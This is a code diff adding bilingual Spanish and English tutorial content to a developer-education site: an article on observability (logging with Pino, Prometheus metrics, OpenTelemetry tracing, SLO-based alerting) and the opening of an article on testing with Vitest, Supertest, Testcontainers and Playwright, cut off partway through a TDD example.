+Imagina que manejas un auto sin tablero de instrumentos. No sabes a que velocidad vas, cuanto combustible te queda, ni si el motor esta por sobrecalentarse. Asi es operar una aplicacion en produccion sin observabilidad.
+
+> **Sin observabilidad, solo te enteras de los problemas cuando tus usuarios se quejan. Con observabilidad, los detectas antes de que los usuarios los noten.**
+
+---
+
+## Los tres pilares de la observabilidad
+
+La observabilidad se construye sobre tres pilares complementarios:
+
+\`\`\`
+┌─────────────────┬─────────────────┬─────────────────┐
+│      LOGS       │    METRICAS     │     TRACES      │
+│                 │                 │                 │
+│  ¿Que paso?     │  ¿Cuanto?       │  ¿Donde?        │
+│                 │                 │                 │
+│  Eventos        │  Numeros que    │  Camino de una  │
+│  discretos con  │  puedes graficar│  request a      │
+│  contexto       │  y alertar      │  traves de      │
+│                 │                 │  servicios      │
+└─────────────────┴─────────────────┴─────────────────┘
+\`\`\`
+
+| Pilar | Pregunta que responde | Ejemplo |
+|-------|----------------------|---------|
+| **Logs** | ¿Que paso exactamente? | "Usuario X fallo login por password incorrecto" |
+| **Metricas** | ¿Como esta el sistema? | "95% de requests < 200ms, 2% errores" |
+| **Traces** | ¿Por donde paso la request? | "API → Auth → DB → Cache → Response (340ms)" |
+
+---
+
+## Logs: El registro de eventos
+
+### Por que console.log no escala
+
+\`\`\`javascript
+// En desarrollo: funciona
+console.log('Usuario logueado:', userId);
+
+// En produccion con 1000 requests/seg:
+// - ¿Como buscas un log especifico?
+// - ¿Como correlacionas logs de la misma request?
+// - ¿Como filtras solo errores?
+// - ¿Como guardas los logs cuando el servidor muere?
+\`\`\`
+
+### Logging estructurado con Pino
+
+\`\`\`javascript
+import pino from 'pino';
+
+const logger = pino({
+  level: process.env.LOG_LEVEL || 'info',
+  formatters: {
+    level: (label) => ({ level: label }),
+  },
+  timestamp: pino.stdTimeFunctions.isoTime,
+});
+
+// Crear logger con contexto de request
+function createRequestLogger(req) {
+  return logger.child({
+    requestId: req.id,
+    userId: req.user?.id,
+    path: req.path,
+    method: req.method,
+  });
+}
+
+// Uso en endpoint
+app.get('/api/orders', async (req, res) => {
+  const log = createRequestLogger(req);
+
+  log.info('Fetching orders');
+
+  try {
+    const orders = await getOrders(req.user.id);
+    log.info({ count: orders.length }, 'Orders fetched successfully');
+    res.json(orders);
+  } catch (error) {
+    log.error({ error: error.message, stack: error.stack }, 'Failed to fetch orders');
+    res.status(500).json({ error: 'Internal error' });
+  }
+});
+\`\`\`
+
+**Output JSON estructurado:**
+\`\`\`json
+{
+  "level": "info",
+  "time": "2026-01-15T10:30:00.000Z",
+  "requestId": "abc-123",
+  "userId": "user-456",
+  "path": "/api/orders",
+  "method": "GET",
+  "msg": "Orders fetched successfully",
+  "count": 25
+}
+\`\`\`
+
+### Niveles de log
+
+| Nivel | Cuando usarlo | Ejemplo |
+|-------|--------------|---------|
+| **error** | Algo fallo y necesita atencion | DB connection lost |
+| **warn** | Algo raro pero no critico | Rate limit casi alcanzado |
+| **info** | Eventos importantes del negocio | Usuario creo orden |
+| **debug** | Detalles para troubleshooting | Query ejecutado en 50ms |
+
+---
+
+## Metricas: Numeros que importan
+
+### Las 4 Golden Signals (Google SRE)
+
+Google SRE define 4 senales clave para monitorear cualquier servicio:
+
+\`\`\`
+┌──────────────┬──────────────┬──────────────┬──────────────┐
+│   LATENCY    │   TRAFFIC    │   ERRORS     │  SATURATION  │
+│              │              │              │              │
+│  ¿Cuanto     │  ¿Cuanta     │  ¿Que %      │  ¿Que tan    │
+│  tarda?      │  demanda?    │  falla?      │  lleno esta? │
+│              │              │              │              │
+│  p50, p95,   │  req/seg     │  % HTTP 5xx  │  CPU, RAM,   │
+│  p99         │  usuarios    │  % timeouts  │  conexiones  │
+└──────────────┴──────────────┴──────────────┴──────────────┘
+\`\`\`
+
+### Prometheus + prom-client
+
+\`\`\`javascript
+import promClient from 'prom-client';
+
+// Recolectar metricas por defecto (CPU, memoria, etc.)
+promClient.collectDefaultMetrics();
+
+// Metrica custom: latencia de requests
+const httpRequestDuration = new promClient.Histogram({
+  name: 'http_request_duration_seconds',
+  help: 'Duration of HTTP requests in seconds',
+  labelNames: ['method', 'route', 'status_code'],
+  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5],
+});
+
+// Metrica custom: requests totales
+const httpRequestsTotal = new promClient.Counter({
+  name: 'http_requests_total',
+  help: 'Total number of HTTP requests',
+  labelNames: ['method', 'route', 'status_code'],
+});
+
+// Middleware para medir requests
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    const duration = (Date.now() - start) / 1000;
+    const labels = {
+      method: req.method,
+      route: req.route?.path || 'unknown',
+      status_code: res.statusCode,
+    };
+
+    httpRequestDuration.observe(labels, duration);
+    httpRequestsTotal.inc(labels);
+  });
+
+  next();
+});
+
+// Endpoint para Prometheus
+app.get('/metrics', async (req, res) => {
+  res.set('Content-Type', promClient.register.contentType);
+  res.end(await promClient.register.metrics());
+});
+\`\`\`
+
+### Tipos de metricas
+
+| Tipo | Descripcion | Ejemplo |
+|------|-------------|---------|
+| **Counter** | Solo incrementa | Total de requests, errores |
+| **Gauge** | Sube y baja | Conexiones activas, temperatura |
+| **Histogram** | Distribucion de valores | Latencia (p50, p95, p99) |
+| **Summary** | Similar a histogram | Percentiles calculados client-side |
+
+---
+
+## Traces: Siguiendo el camino
+
+### El problema de microservicios
+
+En un monolito, seguir una request es facil. En microservicios:
+
+\`\`\`
+Usuario → API Gateway → Auth Service → Order Service → Payment Service → DB
+                ↓               ↓              ↓              ↓
+              ¿Donde esta el cuello de botella? 🤷
+\`\`\`
+
+### OpenTelemetry: El estandar
+
+OpenTelemetry es el estandar open source para instrumentacion.
+
+\`\`\`javascript
+import { NodeSDK } from '@opentelemetry/sdk-node';
+import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
+import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
+
+const sdk = new NodeSDK({
+  serviceName: 'order-service',
+  traceExporter: new OTLPTraceExporter({
+    url: 'http://jaeger:4318/v1/traces',
+  }),
+  instrumentations: [
+    getNodeAutoInstrumentations({
+      '@opentelemetry/instrumentation-http': { enabled: true },
+      '@opentelemetry/instrumentation-express': { enabled: true },
+      '@opentelemetry/instrumentation-pg': { enabled: true },
+    }),
+  ],
+});
+
+sdk.start();
+\`\`\`
+
+### Anatomia de un trace
+
+\`\`\`
+Trace ID: abc-123-xyz
+├── Span: HTTP GET /api/order/123 (450ms)
+│   ├── Span: Auth Middleware (20ms)
+│   ├── Span: DB Query: SELECT * FROM orders (150ms)
+│   ├── Span: HTTP POST payment-service/charge (250ms)
+│   │   ├── Span: Validate card (30ms)
+│   │   └── Span: Process payment (220ms)
+│   └── Span: Send confirmation email (30ms)
+\`\`\`
+
+---
+
+## Stack recomendado 2026
+
+### Open Source (auto-hospedado)
+
+\`\`\`yaml
+# docker-compose.yml - Stack de observabilidad
+services:
+  # Metricas
+  prometheus:
+    image: prom/prometheus:latest
+    volumes:
+      - ./prometheus.yml:/etc/prometheus/prometheus.yml
+    ports:
+      - "9090:9090"
+
+  # Visualizacion
+  grafana:
+    image: grafana/grafana:latest
+    environment:
+      - GF_SECURITY_ADMIN_PASSWORD=secret
+    ports:
+      - "3000:3000"
+    volumes:
+      - grafana-data:/var/lib/grafana
+
+  # Logs
+  loki:
+    image: grafana/loki:latest
+    ports:
+      - "3100:3100"
+
+  # Traces
+  jaeger:
+    image: jaegertracing/all-in-one:latest
+    ports:
+      - "16686:16686"  # UI
+      - "4318:4318"    # OTLP HTTP
+\`\`\`
+
+### Servicios Managed (SaaS)
+
+| Servicio | Especialidad | Tier Gratis |
+|----------|--------------|-------------|
+| **Grafana Cloud** | Metricas + Logs + Traces | 10k series, 50GB logs |
+| **Datadog** | All-in-one observabilidad | Trial 14 dias |
+| **New Relic** | APM completo | 100GB/mes gratis |
+| **Sentry** | Errores y performance | 5k errores/mes |
+
+---
+
+## Alerting efectivo
+
+### Por que "alertar todo" es contraproducente
+
+\`\`\`
+Alerta: CPU > 50%          → Ignorada (normal en picos)
+Alerta: Memoria > 60%      → Ignorada (siempre asi)
+Alerta: Request lento      → Ignorada (ya vimos 100 hoy)
+Alerta: Base de datos caida → Ignorada por habito... OOPS
+\`\`\`
+
+**Resultado: Alert fatigue. El equipo ignora todas las alertas.**
+
+### SLOs y Error Budgets
+
+En lugar de alertar por sintomas, alerta cuando afectas al usuario:
+
+\`\`\`
+SLO (Service Level Objective):
+"99.9% de requests en menos de 500ms"
+
+Error Budget:
+- 30 dias × 24 horas × 60 min = 43,200 minutos
+- 0.1% de error budget = 43.2 minutos de downtime permitido
+
+Alerta cuando:
+- Consumiste > 50% del budget en 1 hora
+- Consumiste > 80% del budget en el mes
+\`\`\`
+
+### Anatomia de una buena alerta
+
+\`\`\`yaml
+# prometheus/alerts.yml
+groups:
+  - name: api-alerts
+    rules:
+      - alert: HighErrorRate
+        expr: |
+          sum(rate(http_requests_total{status_code=~"5.."}[5m])) /
+          sum(rate(http_requests_total[5m])) > 0.01
+        for: 5m  # Solo alerta si persiste 5 min
+        labels:
+          severity: critical
+        annotations:
+          summary: "Error rate > 1% por 5 minutos"
+          runbook: "https://wiki.tu-empresa.com/runbooks/high-error-rate"
+          dashboard: "https://grafana.tu-empresa.com/d/api-health"
+\`\`\`
+
+---
+
+## Checklist de observabilidad
+
+- [ ] Logs estructurados con requestId para correlacion
+- [ ] Metricas de las 4 Golden Signals expuestas
+- [ ] Traces configurados entre servicios
+- [ ] Dashboards con las metricas clave
+- [ ] Alertas basadas en SLOs, no sintomas
+- [ ] Runbooks documentados para cada alerta
+- [ ] Retencion de datos definida (30 dias logs, 15 dias traces)
+
+---
+
+## Practica
+
+-> [Configurar Prometheus + Grafana](/es/cooking/monitoring-stack)
+-> [Logging profesional con Pino + Loki](/es/cooking/logging-production)
+
+---
+
+## Recursos
+
+- [Google SRE Book (gratis)](https://sre.google/sre-book/table-of-contents/)
+- [Observability Engineering - Charity Majors](https://www.oreilly.com/library/view/observability-engineering/9781492076438/)
+- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)
+- [Prometheus Documentation](https://prometheus.io/docs/)
+    `,
+    contentEn: `
+## The black box problem
+
+Imagine driving a car without a dashboard. You dont know how fast youre going, how much fuel you have left, or if the engine is about to overheat. Thats what operating an application in production without observability is like.
+
+> **Without observability, you only learn about problems when your users complain. With observability, you detect them before users notice.**
+
+---
+
+## The three pillars of observability
+
+Observability is built on three complementary pillars:
+
+\`\`\`
+┌─────────────────┬─────────────────┬─────────────────┐
+│      LOGS       │     METRICS     │     TRACES      │
+│                 │                 │                 │
+│  What happened? │  How much?      │  Where?         │
+│                 │                 │                 │
+│  Discrete       │  Numbers you    │  Path of a      │
+│  events with    │  can graph      │  request across │
+│  context        │  and alert on   │  services       │
+└─────────────────┴─────────────────┴─────────────────┘
+\`\`\`
+
+| Pillar | Question it answers | Example |
+|--------|---------------------|---------|
+| **Logs** | What exactly happened? | "User X failed login due to wrong password" |
+| **Metrics** | How is the system doing? | "95% of requests < 200ms, 2% errors" |
+| **Traces** | Where did the request go? | "API → Auth → DB → Cache → Response (340ms)" |
+
+---
+
+## Logs: The event record
+
+### Why console.log doesnt scale
+
+\`\`\`javascript
+// In development: works fine
+console.log('User logged in:', userId);
+
+// In production with 1000 requests/sec:
+// - How do you search for a specific log?
+// - How do you correlate logs from the same request?
+// - How do you filter only errors?
+// - How do you keep logs when the server dies?
+\`\`\`
+
+### Structured logging with Pino
+
+\`\`\`javascript
+import pino from 'pino';
+
+const logger = pino({
+  level: process.env.LOG_LEVEL || 'info',
+  formatters: {
+    level: (label) => ({ level: label }),
+  },
+  timestamp: pino.stdTimeFunctions.isoTime,
+});
+
+// Create logger with request context
+function createRequestLogger(req) {
+  return logger.child({
+    requestId: req.id,
+    userId: req.user?.id,
+    path: req.path,
+    method: req.method,
+  });
+}
+
+// Usage in endpoint
+app.get('/api/orders', async (req, res) => {
+  const log = createRequestLogger(req);
+
+  log.info('Fetching orders');
+
+  try {
+    const orders = await getOrders(req.user.id);
+    log.info({ count: orders.length }, 'Orders fetched successfully');
+    res.json(orders);
+  } catch (error) {
+    log.error({ error: error.message, stack: error.stack }, 'Failed to fetch orders');
+    res.status(500).json({ error: 'Internal error' });
+  }
+});
+\`\`\`
+
+**Structured JSON output:**
+\`\`\`json
+{
+  "level": "info",
+  "time": "2026-01-15T10:30:00.000Z",
+  "requestId": "abc-123",
+  "userId": "user-456",
+  "path": "/api/orders",
+  "method": "GET",
+  "msg": "Orders fetched successfully",
+  "count": 25
+}
+\`\`\`
+
+### Log levels
+
+| Level | When to use | Example |
+|-------|-------------|---------|
+| **error** | Something failed and needs attention | DB connection lost |
+| **warn** | Something odd but not critical | Rate limit almost reached |
+| **info** | Important business events | User created order |
+| **debug** | Details for troubleshooting | Query executed in 50ms |
+
+---
+
+## Metrics: Numbers that matter
+
+### The 4 Golden Signals (Google SRE)
+
+Google SRE defines 4 key signals for monitoring any service:
+
+\`\`\`
+┌──────────────┬──────────────┬──────────────┬──────────────┐
+│   LATENCY    │   TRAFFIC    │   ERRORS     │  SATURATION  │
+│              │              │              │              │
+│  How long    │  How much    │  What %      │  How full    │
+│  does it     │  demand?     │  fails?      │  is it?      │
+│  take?       │              │              │              │
+│              │              │              │              │
+│  p50, p95,   │  req/sec     │  % HTTP 5xx  │  CPU, RAM,   │
+│  p99         │  users       │  % timeouts  │  connections │
+└──────────────┴──────────────┴──────────────┴──────────────┘
+\`\`\`
+
+### Prometheus + prom-client
+
+\`\`\`javascript
+import promClient from 'prom-client';
+
+// Collect default metrics (CPU, memory, etc.)
+promClient.collectDefaultMetrics();
+
+// Custom metric: request latency
+const httpRequestDuration = new promClient.Histogram({
+  name: 'http_request_duration_seconds',
+  help: 'Duration of HTTP requests in seconds',
+  labelNames: ['method', 'route', 'status_code'],
+  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5],
+});
+
+// Custom metric: total requests
+const httpRequestsTotal = new promClient.Counter({
+  name: 'http_requests_total',
+  help: 'Total number of HTTP requests',
+  labelNames: ['method', 'route', 'status_code'],
+});
+
+// Middleware to measure requests
+app.use((req, res, next) => {
+  const start = Date.now();
+
+  res.on('finish', () => {
+    const duration = (Date.now() - start) / 1000;
+    const labels = {
+      method: req.method,
+      route: req.route?.path || 'unknown',
+      status_code: res.statusCode,
+    };
+
+    httpRequestDuration.observe(labels, duration);
+    httpRequestsTotal.inc(labels);
+  });
+
+  next();
+});
+
+// Endpoint for Prometheus
+app.get('/metrics', async (req, res) => {
+  res.set('Content-Type', promClient.register.contentType);
+  res.end(await promClient.register.metrics());
+});
+\`\`\`
+
+### Metric types
+
+| Type | Description | Example |
+|------|-------------|---------|
+| **Counter** | Only increments | Total requests, errors |
+| **Gauge** | Goes up and down | Active connections, temperature |
+| **Histogram** | Distribution of values | Latency (p50, p95, p99) |
+| **Summary** | Similar to histogram | Client-side calculated percentiles |
+
+---
+
+## Traces: Following the path
+
+### The microservices problem
+
+In a monolith, following a request is easy. In microservices:
+
+\`\`\`
+User → API Gateway → Auth Service → Order Service → Payment Service → DB
+              ↓               ↓              ↓              ↓
+           Where is the bottleneck? 🤷
+\`\`\`
+
+### OpenTelemetry: The standard
+
+OpenTelemetry is the open source standard for instrumentation.
+
+\`\`\`javascript
+import { NodeSDK } from '@opentelemetry/sdk-node';
+import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
+import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
+
+const sdk = new NodeSDK({
+  serviceName: 'order-service',
+  traceExporter: new OTLPTraceExporter({
+    url: 'http://jaeger:4318/v1/traces',
+  }),
+  instrumentations: [
+    getNodeAutoInstrumentations({
+      '@opentelemetry/instrumentation-http': { enabled: true },
+      '@opentelemetry/instrumentation-express': { enabled: true },
+      '@opentelemetry/instrumentation-pg': { enabled: true },
+    }),
+  ],
+});
+
+sdk.start();
+\`\`\`
+
+### Anatomy of a trace
+
+\`\`\`
+Trace ID: abc-123-xyz
+├── Span: HTTP GET /api/order/123 (450ms)
+│   ├── Span: Auth Middleware (20ms)
+│   ├── Span: DB Query: SELECT * FROM orders (150ms)
+│   ├── Span: HTTP POST payment-service/charge (250ms)
+│   │   ├── Span: Validate card (30ms)
+│   │   └── Span: Process payment (220ms)
+│   └── Span: Send confirmation email (30ms)
+\`\`\`
+
+---
+
+## Recommended stack 2026
+
+### Open Source (self-hosted)
+
+\`\`\`yaml
+# docker-compose.yml - Observability stack
+services:
+  # Metrics
+  prometheus:
+    image: prom/prometheus:latest
+    volumes:
+      - ./prometheus.yml:/etc/prometheus/prometheus.yml
+    ports:
+      - "9090:9090"
+
+  # Visualization
+  grafana:
+    image: grafana/grafana:latest
+    environment:
+      - GF_SECURITY_ADMIN_PASSWORD=secret
+    ports:
+      - "3000:3000"
+    volumes:
+      - grafana-data:/var/lib/grafana
+
+  # Logs
+  loki:
+    image: grafana/loki:latest
+    ports:
+      - "3100:3100"
+
+  # Traces
+  jaeger:
+    image: jaegertracing/all-in-one:latest
+    ports:
+      - "16686:16686"  # UI
+      - "4318:4318"    # OTLP HTTP
+\`\`\`
+
+### Managed Services (SaaS)
+
+| Service | Specialty | Free Tier |
+|---------|-----------|-----------|
+| **Grafana Cloud** | Metrics + Logs + Traces | 10k series, 50GB logs |
+| **Datadog** | All-in-one observability | 14-day trial |
+| **New Relic** | Complete APM | 100GB/month free |
+| **Sentry** | Errors and performance | 5k errors/month |
+
+---
+
+## Effective alerting
+
+### Why "alert on everything" is counterproductive
+
+\`\`\`
+Alert: CPU > 50%          → Ignored (normal during peaks)
+Alert: Memory > 60%       → Ignored (always like this)
+Alert: Slow request       → Ignored (seen 100 today)
+Alert: Database down      → Ignored out of habit... OOPS
+\`\`\`
+
+**Result: Alert fatigue. The team ignores all alerts.**
+
+### SLOs and Error Budgets
+
+Instead of alerting on symptoms, alert when you affect the user:
+
+\`\`\`
+SLO (Service Level Objective):
+"99.9% of requests in less than 500ms"
+
+Error Budget:
+- 30 days × 24 hours × 60 min = 43,200 minutes
+- 0.1% error budget = 43.2 minutes of allowed downtime
+
+Alert when:
+- Consumed > 50% of budget in 1 hour
+- Consumed > 80% of budget in the month
+\`\`\`
+
+### Anatomy of a good alert
+
+\`\`\`yaml
+# prometheus/alerts.yml
+groups:
+  - name: api-alerts
+    rules:
+      - alert: HighErrorRate
+        expr: |
+          sum(rate(http_requests_total{status_code=~"5.."}[5m])) /
+          sum(rate(http_requests_total[5m])) > 0.01
+        for: 5m  # Only alert if it persists for 5 min
+        labels:
+          severity: critical
+        annotations:
+          summary: "Error rate > 1% for 5 minutes"
+          runbook: "https://wiki.your-company.com/runbooks/high-error-rate"
+          dashboard: "https://grafana.your-company.com/d/api-health"
+\`\`\`
+
+---
+
+## Observability checklist
+
+- [ ] Structured logs with requestId for correlation
+- [ ] 4 Golden Signals metrics exposed
+- [ ] Traces configured between services
+- [ ] Dashboards with key metrics
+- [ ] Alerts based on SLOs, not symptoms
+- [ ] Runbooks documented for each alert
+- [ ] Data retention defined (30 days logs, 15 days traces)
+
+---
+
+## Practice
+
+-> [Set up Prometheus + Grafana](/en/cooking/monitoring-stack)
+-> [Professional logging with Pino + Loki](/en/cooking/logging-production)
+
+---
+
+## Resources
+
+- [Google SRE Book (free)](https://sre.google/sre-book/table-of-contents/)
+- [Observability Engineering - Charity Majors](https://www.oreilly.com/library/view/observability-engineering/9781492076438/)
+- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)
+- [Prometheus Documentation](https://prometheus.io/docs/)
+    `,
+  },
+
+  'testing': {
+    contentEs: `
+## Tu red de seguridad para cambios
+
+Imagina que eres cirujano y tienes que operar sin anestesia ni monitores. Cada corte es un riesgo, y no sabes si algo salio mal hasta que es demasiado tarde. Programar sin tests es exactamente asi.
+
+> **Los tests no son para encontrar bugs. Son para darte la confianza de hacer cambios sin miedo a romper todo.**
+
+---
+
+## El costo de los bugs
+
+| Etapa donde se encuentra el bug | Costo relativo |
+|--------------------------------|----------------|
+| Durante desarrollo | 1x |
+| Durante code review | 2x |
+| Durante QA | 10x |
+| En produccion | 100x |
+| Despues de perdida de clientes | 1000x |
+
+---
+
+## La piramide de testing
+
+\`\`\`
+         /\\
+        /E2E\\           Pocos, lentos, fragiles
+       /──────\\         (5% de tus tests)
+      /Integration\\     Balance costo/valor
+     /──────────────\\   (15% de tus tests)
+    /   Unit Tests   \\  Muchos, rapidos, estables
+   /──────────────────\\ (80% de tus tests)
+\`\`\`
+
+| Tipo | Que prueba | Velocidad | Fragilidad |
+|------|------------|-----------|------------|
+| **Unit** | Una funcion aislada | ms | Muy estable |
+| **Integration** | Varios modulos juntos | segundos | Moderada |
+| **E2E** | Flujo completo como usuario | minutos | Fragil |
+
+---
+
+## Unit Testing con Vitest
+
+### Setup basico
+
+\`\`\`bash
+npm install -D vitest @vitest/coverage-v8
+\`\`\`
+
+\`\`\`javascript
+// vitest.config.ts
+import { defineConfig } from 'vitest/config';
+
+export default defineConfig({
+  test: {
+    globals: true,
+    environment: 'node',
+    coverage: {
+      provider: 'v8',
+      reporter: ['text', 'html'],
+    },
+  },
+});
+\`\`\`
+
+### Patron AAA (Arrange, Act, Assert)
+
+\`\`\`javascript
+// src/utils/price.ts
+export function calculateTotal(items: Item[], taxRate: number): number {
+  const subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0);
+  return subtotal * (1 + taxRate);
+}
+
+// src/utils/price.test.ts
+import { describe, it, expect } from 'vitest';
+import { calculateTotal } from './price';
+
+describe('calculateTotal', () => {
+  it('calcula total con impuesto', () => {
+    // Arrange - Preparar datos
+    const items = [
+      { price: 100, quantity: 2 },
+      { price: 50, quantity: 1 },
+    ];
+    const taxRate = 0.16;
+
+    // Act - Ejecutar funcion
+    const result = calculateTotal(items, taxRate);
+
+    // Assert - Verificar resultado
+    expect(result).toBe(290); // (200 + 50) * 1.16 = 290
+  });
+
+  it('retorna 0 para carrito vacio', () => {
+    expect(calculateTotal([], 0.16)).toBe(0);
+  });
+
+  it('maneja tax rate de 0', () => {
+    const items = [{ price: 100, quantity: 1 }];
+    expect(calculateTotal(items, 0)).toBe(100);
+  });
+});
+\`\`\`
+
+### Mocking: Cuando y como
+
+\`\`\`javascript
+// src/services/user.ts
+import { db } from './database';
+import { sendEmail } from './email';
+
+export async function createUser(email: string, name: string) {
+  const user = await db.user.create({ data: { email, name } });
+  await sendEmail(email, 'Welcome!', \`Hello \${name}\`);
+  return user;
+}
+
+// src/services/user.test.ts
+import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { createUser } from './user';
+import { db } from './database';
+import { sendEmail } from './email';
+
+// Mock de modulos externos
+vi.mock('./database', () => ({
+  db: {
+    user: {
+      create: vi.fn(),
+    },
+  },
+}));
+
+vi.mock('./email', () => ({
+  sendEmail: vi.fn(),
+}));
+
+describe('createUser', () => {
+  beforeEach(() => {
+    vi.clearAllMocks();
+  });
+
+  it('crea usuario y envia email', async () => {
+    // Arrange
+    const mockUser = { id: 1, email: 'test@example.com', name: 'Test' };
+    vi.mocked(db.user.create).mockResolvedValue(mockUser);
+    vi.mocked(sendEmail).mockResolvedValue(undefined);
+
+    // Act
+    const result = await createUser('test@example.com', 'Test');
+
+    // Assert
+    expect(db.user.create).toHaveBeenCalledWith({
+      data: { email: 'test@example.com', name: 'Test' },
+    });
+    expect(sendEmail).toHaveBeenCalledWith(
+      'test@example.com',
+      'Welcome!',
+      'Hello Test'
+    );
+    expect(result).toEqual(mockUser);
+  });
+});
+\`\`\`
+
+---
+
+## Integration Testing
+
+### Testing de APIs con Supertest
+
+\`\`\`javascript
+// src/app.test.ts
+import { describe, it, expect, beforeAll, afterAll } from 'vitest';
+import request from 'supertest';
+import { app } from './app';
+import { db } from './database';
+
+describe('API /users', () => {
+  beforeAll(async () => {
+    // Setup: limpiar y poblar DB de test
+    await db.user.deleteMany();
+    await db.user.create({
+      data: { email: 'existing@test.com', name: 'Existing' },
+    });
+  });
+
+  afterAll(async () => {
+    await db.$disconnect();
+  });
+
+  it('GET /users retorna lista de usuarios', async () => {
+    const response = await request(app)
+      .get('/users')
+      .expect('Content-Type', /json/)
+      .expect(200);
+
+    expect(response.body).toHaveLength(1);
+    expect(response.body[0].email).toBe('existing@test.com');
+  });
+
+  it('POST /users crea nuevo usuario', async () => {
+    const response = await request(app)
+      .post('/users')
+      .send({ email: 'new@test.com', name: 'New User' })
+      .expect(201);
+
+    expect(response.body.email).toBe('new@test.com');
+  });
+
+  it('POST /users con email duplicado retorna 400', async () => {
+    const response = await request(app)
+      .post('/users')
+      .send({ email: 'existing@test.com', name: 'Duplicate' })
+      .expect(400);
+
+    expect(response.body.error).toContain('already exists');
+  });
+});
+\`\`\`
+
+### Testcontainers: Bases de datos reales
+
+\`\`\`javascript
+// src/db.test.ts
+import { describe, it, expect, beforeAll, afterAll } from 'vitest';
+import { PostgreSqlContainer } from '@testcontainers/postgresql';
+import { PrismaClient } from '@prisma/client';
+
+describe('Database Integration', () => {
+  let container;
+  let prisma;
+
+  beforeAll(async () => {
+    // Iniciar contenedor PostgreSQL real
+    container = await new PostgreSqlContainer()
+      .withDatabase('testdb')
+      .start();
+
+    // Conectar Prisma al contenedor
+    prisma = new PrismaClient({
+      datasources: {
+        db: { url: container.getConnectionUri() },
+      },
+    });
+
+    // Ejecutar migraciones
+    await prisma.$executeRaw\`CREATE TABLE users (id SERIAL, email TEXT, name TEXT)\`;
+  }, 60000); // Timeout largo para iniciar contenedor
+
+  afterAll(async () => {
+    await prisma.$disconnect();
+    await container.stop();
+  });
+
+  it('inserta y lee usuario de PostgreSQL real', async () => {
+    await prisma.$executeRaw\`INSERT INTO users (email, name) VALUES ('test@db.com', 'DB Test')\`;
+
+    const users = await prisma.$queryRaw\`SELECT * FROM users WHERE email = 'test@db.com'\`;
+
+    expect(users).toHaveLength(1);
+    expect(users[0].name).toBe('DB Test');
+  });
+});
+\`\`\`
+
+---
+
+## E2E Testing con Playwright
+
+### Setup
+
+\`\`\`bash
+npm init playwright@latest
+\`\`\`
+
+### Test E2E basico
+
+\`\`\`javascript
+// e2e/login.spec.ts
+import { test, expect } from '@playwright/test';
+
+test.describe('Login Flow', () => {
+  test('usuario puede hacer login', async ({ page }) => {
+    // Navegar a la pagina
+    await page.goto('/login');
+
+    // Llenar formulario
+    await page.fill('[data-testid="email"]', 'user@example.com');
+    await page.fill('[data-testid="password"]', 'password123');
+
+    // Click en submit
+    await page.click('[data-testid="submit"]');
+
+    // Verificar redireccion a dashboard
+    await expect(page).toHaveURL('/dashboard');
+    await expect(page.locator('h1')).toContainText('Welcome');
+  });
+
+  test('muestra error con credenciales invalidas', async ({ page }) => {
+    await page.goto('/login');
+
+    await page.fill('[data-testid="email"]', 'wrong@example.com');
+    await page.fill('[data-testid="password"]', 'wrongpass');
+    await page.click('[data-testid="submit"]');
+
+    // Verificar mensaje de error
+    await expect(page.locator('[data-testid="error"]')).toBeVisible();
+    await expect(page.locator('[data-testid="error"]')).toContainText('Invalid credentials');
+  });
+});
+\`\`\`
+
+### Page Object Pattern
+
+\`\`\`javascript
+// e2e/pages/LoginPage.ts
+import { Page, Locator } from '@playwright/test';
+
+export class LoginPage {
+  readonly page: Page;
+  readonly emailInput: Locator;
+  readonly passwordInput: Locator;
+  readonly submitButton: Locator;
+  readonly errorMessage: Locator;
+
+  constructor(page: Page) {
+    this.page = page;
+    this.emailInput = page.locator('[data-testid="email"]');
+    this.passwordInput = page.locator('[data-testid="password"]');
+    this.submitButton = page.locator('[data-testid="submit"]');
+    this.errorMessage = page.locator('[data-testid="error"]');
+  }
+
+  async goto() {
+    await this.page.goto('/login');
+  }
+
+  async login(email: string, password: string) {
+    await this.emailInput.fill(email);
+    await this.passwordInput.fill(password);
+    await this.submitButton.click();
+  }
+}
+
+// e2e/login.spec.ts (usando Page Object)
+import { test, expect } from '@playwright/test';
+import { LoginPage } from './pages/LoginPage';
+
+test('login exitoso', async ({ page }) => {
+  const loginPage = new LoginPage(page);
+  await loginPage.goto();
+  await loginPage.login('user@example.com', 'password123');
+
+  await expect(page).toHaveURL('/dashboard');
+});
+\`\`\`
+
+---
+
+## TDD: Test Driven Development
+
+### El ciclo Red-Green-Refactor
+
+\`\`\`
+┌──────────┐     ┌──────────┐     ┌──────────┐
+│   RED    │ ──→ │  GREEN   │ ──→ │ REFACTOR │ ──┐
+│          │     │          │     │          │   │
+│ Escribe  │     │ Escribe  │     │ Mejora   │   │
+│ test que │     │ codigo   │     │ codigo   │   │
+│ falla    │     │ minimo   │     │ sin      │   │
+│          │     │ para     │     │ romper   │   │
+│          │     │ pasar    │     │ tests    │   │
+└──────────┘     └──────────┘     └──────────┘   │
+     ↑                                           │
+     └───────────────────────────────────────────┘
+\`\`\`
+
+### Ejemplo TDD: Validador de password
+
+\`\`\`javascript
+// Paso 1: RED - Test que falla
+// password.test.ts
+describe('validatePassword', () => {
+  it('rechaza password menor a 8 caracteres', () => {
+    expect(validatePassword('short')).toBe(false);
+  });
+});
+
+// validatePassword no existe aun → test falla ✓
+
+// Paso 2: GREEN - Codigo minimo
+// password.ts
+export function validatePassword(password: string): boolean {
+  return password.length >= 8;
+}
+
+// Test pasa ✓
+
+// Paso 3: RED - Nuevo requisito
+it('rechaza password sin mayusculas', () => {
+  expect(validatePassword('lowercase123')).toBe(false);
+});
+
+// Test falla ✓
+
+// Paso 4: GREEN
+export function validatePassword(password: string): boolean {
+  if (password.length < 8) return false;
+  if (!/[A-Z]/.test(password)) return false;
+  return true;
+}
+
+// Paso 5: REFACTOR
+export function validatePassword(password: string): boolean {
+  const rules = [
+    (p: string) => p.length >= 8,
